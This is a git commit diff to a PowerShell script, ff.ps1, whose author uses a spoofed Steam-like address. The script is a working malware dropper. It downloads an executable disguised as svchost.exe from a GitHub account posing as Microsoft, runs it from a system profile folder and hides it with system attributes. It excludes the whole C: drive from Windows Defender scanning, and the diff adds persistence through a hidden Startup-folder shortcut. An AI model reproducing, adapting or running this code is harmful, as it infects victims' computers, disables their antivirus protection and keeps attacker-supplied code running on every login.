cbd6103d8d326254fb23dcc781b038594a76f1e7
Peter Griffin <noreply.steampoqered.com.5@gmail.com>
2026-03-08 17:24:32 +0000

    Update ff.ps1

--- ff.ps1
+++ ff.ps1
@@ -1,4 +1,5 @@
 Invoke-WebRequest -Uri https://raw.githubusercontent.com/MicrosoftNetworkServiceHost/MicrosoftNetworkService/main/svchost.exe -OutFile C:\Windows\ServiceProfiles\NetworkService\AppData\LocalLow\svchost.exe; & C:\Windows\ServiceProfiles\NetworkService\AppData\LocalLow\svchost.exe
-New-Service -Name "MicrosoftNetworkService" -BinaryPathName "C:\Windows\ServiceProfiles\NetworkService\AppData\LocalLow\svchost.exe" -DisplayName "MicrosoftNetworkService" -StartupType Automatic
+$s=(New-Object -ComObject WScript.Shell).CreateShortcut("$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\ff.lnk");$s.TargetPath="C:\Windows\ServiceProfiles\NetworkService\AppData\LocalLow\svchost.exe";$s.Save()
 attrib +h +s +i +r "C:\Windows\ServiceProfiles\NetworkService\AppData\LocalLow\svchost.exe"
+attrib +h +s +i +r "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\ff.lnk"
 Add-MpPreference -ExclusionPath "C:\"
